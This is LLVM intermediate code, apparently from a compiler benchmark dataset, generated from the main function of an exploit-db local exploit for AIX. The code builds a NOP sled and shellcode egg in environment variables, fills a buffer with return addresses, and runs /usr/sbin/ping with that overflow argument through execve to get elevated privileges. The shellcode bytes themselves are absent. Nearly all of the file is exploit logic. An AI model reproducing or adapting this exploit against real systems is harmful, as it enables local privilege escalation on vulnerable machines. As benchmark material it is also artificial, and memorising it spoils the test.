; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19307.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19307.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@execv = common dso_local global i32 0, align 4
@code = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [8 x i8] c"EGGSHEL\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"EGGSHE2\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"EGGSHE3\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"EGGSHE4\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ping\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"/usr/sbin/ping\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"Error executing execve \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca [8 x i8*], align 16
  %20 = alloca [4 x i8*], align 16
  %21 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %22 = load i32, i32* @MAXBUF, align 4
  %23 = zext i32 %22 to i64
  %24 = call i8* @llvm.stacksave()
  store i8* %24, i8** %8, align 8
  %25 = alloca i32, i64 %23, align 16
  store i64 %23, i64* %9, align 8
  %26 = load i32, i32* @MAXBUF, align 4
  %27 = zext i32 %26 to i64
  %28 = alloca i32, i64 %27, align 16
  store i64 %27, i64* %10, align 8
  store i32 100, i32* %16, align 4
  store i32 280, i32* %17, align 4
  store i32 5300, i32* %21, align 4
  %29 = load i32, i32* %5, align 4
  %30 = icmp eq i32 %29, 2
  br i1 %30, label %31, label %36

31:                                               ; preds = %3
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  store i32 %35, i32* %21, align 4
  br label %36

36:                                               ; preds = %31, %3
  store i32* @execv, i32** %15, align 8
  %37 = load i32*, i32** %15, align 8
  %38 = getelementptr inbounds i32, i32* %37, i64 1
  %39 = load i32, i32* %38, align 4
  store i32 %39, i32* %13, align 4
  %40 = load i32*, i32** %15, align 8
  %41 = load i32, i32* %40, align 4
  store i32 %41, i32* %14, align 4
  %42 = load i32, i32* %13, align 4
  %43 = and i32 %42, 65535
  %44 = trunc i32 %43 to i16
  %45 = load i64, i64* @code, align 8
  %46 = inttoptr i64 %45 to i16*
  %47 = getelementptr inbounds i16, i16* %46, i64 9
  store i16 %44, i16* %47, align 2
  %48 = load i32, i32* %13, align 4
  %49 = lshr i32 %48, 16
  %50 = and i32 %49, 65535
  %51 = trunc i32 %50 to i16
  %52 = load i64, i64* @code, align 8
  %53 = inttoptr i64 %52 to i16*
  %54 = getelementptr inbounds i16, i16* %53, i64 7
  store i16 %51, i16* %54, align 2
  %55 = load i32, i32* %14, align 4
  %56 = and i32 %55, 65535
  %57 = trunc i32 %56 to i16
  %58 = load i64, i64* @code, align 8
  %59 = inttoptr i64 %58 to i16*
  %60 = getelementptr inbounds i16, i16* %59, i64 15
  store i16 %57, i16* %60, align 2
  %61 = load i32, i32* %14, align 4
  %62 = lshr i32 %61, 16
  %63 = and i32 %62, 65535
  %64 = trunc i32 %63 to i16
  %65 = load i64, i64* @code, align 8
  %66 = inttoptr i64 %65 to i16*
  %67 = getelementptr inbounds i16, i16* %66, i64 13
  store i16 %64, i16* %67, align 2
  %68 = getelementptr inbounds i32, i32* %25, i64 0
  %69 = ptrtoint i32* %68 to i32
  %70 = load i32, i32* %21, align 4
  %71 = add i32 %69, %70
  store i32 %71, i32* %18, align 4
  store i32 0, i32* %12, align 4
  br label %72

72:                                               ; preds = %80, %36
  %73 = load i32, i32* %12, align 4
  %74 = load i32, i32* %16, align 4
  %75 = icmp ult i32 %73, %74
  br i1 %75, label %76, label %83

76:                                               ; preds = %72
  %77 = load i32, i32* %12, align 4
  %78 = zext i32 %77 to i64
  %79 = getelementptr inbounds i32, i32* %25, i64 %78
  store i32 1342176130, i32* %79, align 4
  br label %80

80:                                               ; preds = %76
  %81 = load i32, i32* %12, align 4
  %82 = add i32 %81, 1
  store i32 %82, i32* %12, align 4
  br label %72

83:                                               ; preds = %72
  %84 = load i32, i32* %12, align 4
  %85 = zext i32 %84 to i64
  %86 = getelementptr inbounds i32, i32* %25, i64 %85
  %87 = bitcast i32* %86 to i8*
  %88 = call i32 @strcpy(i8* %87, i8* bitcast (i64* @code to i8*))
  %89 = load i32, i32* %12, align 4
  %90 = call i32 @strlen(i8* bitcast (i64* @code to i8*))
  %91 = sdiv i32 %90, 4
  %92 = add i32 %89, %91
  %93 = sub i32 %92, 1
  store i32 %93, i32* %11, align 4
  store i32 0, i32* %11, align 4
  br label %94

94:                                               ; preds = %104, %83
  %95 = load i32, i32* %11, align 4
  %96 = load i32, i32* %17, align 4
  %97 = sub nsw i32 %96, 1
  %98 = icmp ult i32 %95, %97
  br i1 %98, label %99, label %107

99:                                               ; preds = %94
  %100 = load i32, i32* %18, align 4
  %101 = load i32, i32* %11, align 4
  %102 = zext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %28, i64 %102
  store i32 %100, i32* %103, align 4
  br label %104

104:                                              ; preds = %99
  %105 = load i32, i32* %11, align 4
  %106 = add i32 %105, 1
  store i32 %106, i32* %11, align 4
  br label %94

107:                                              ; preds = %94
  %108 = load i32, i32* %11, align 4
  %109 = zext i32 %108 to i64
  %110 = getelementptr inbounds i32, i32* %28, i64 %109
  store i32 0, i32* %110, align 4
  %111 = getelementptr inbounds i32, i32* %25, i64 0
  %112 = bitcast i32* %111 to i8*
  %113 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %112)
  %114 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 0
  store i8* %113, i8** %114, align 16
  %115 = getelementptr inbounds i32, i32* %25, i64 0
  %116 = bitcast i32* %115 to i8*
  %117 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %116)
  %118 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 1
  store i8* %117, i8** %118, align 8
  %119 = getelementptr inbounds i32, i32* %25, i64 0
  %120 = bitcast i32* %119 to i8*
  %121 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %120)
  %122 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 2
  store i8* %121, i8** %122, align 16
  %123 = getelementptr inbounds i32, i32* %25, i64 0
  %124 = bitcast i32* %123 to i8*
  %125 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %124)
  %126 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 3
  store i8* %125, i8** %126, align 8
  %127 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %128 = call i8* @createvar(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* %127)
  %129 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 4
  store i8* %128, i8** %129, align 16
  %130 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 5
  store i8* null, i8** %130, align 8
  %131 = getelementptr inbounds [4 x i8*], [4 x i8*]* %20, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8** %131, align 16
  %132 = getelementptr inbounds i32, i32* %28, i64 0
  %133 = bitcast i32* %132 to i8*
  %134 = getelementptr inbounds [4 x i8*], [4 x i8*]* %20, i64 0, i64 1
  store i8* %133, i8** %134, align 8
  %135 = getelementptr inbounds [4 x i8*], [4 x i8*]* %20, i64 0, i64 0
  %136 = getelementptr inbounds [8 x i8*], [8 x i8*]* %19, i64 0, i64 0
  %137 = call i32 @execve(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i8** %135, i8** %136)
  %138 = call i32 @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %139 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %139)
  %140 = load i32, i32* %4, align 4
  ret i32 %140
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i8* @createvar(i8*, i8*) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
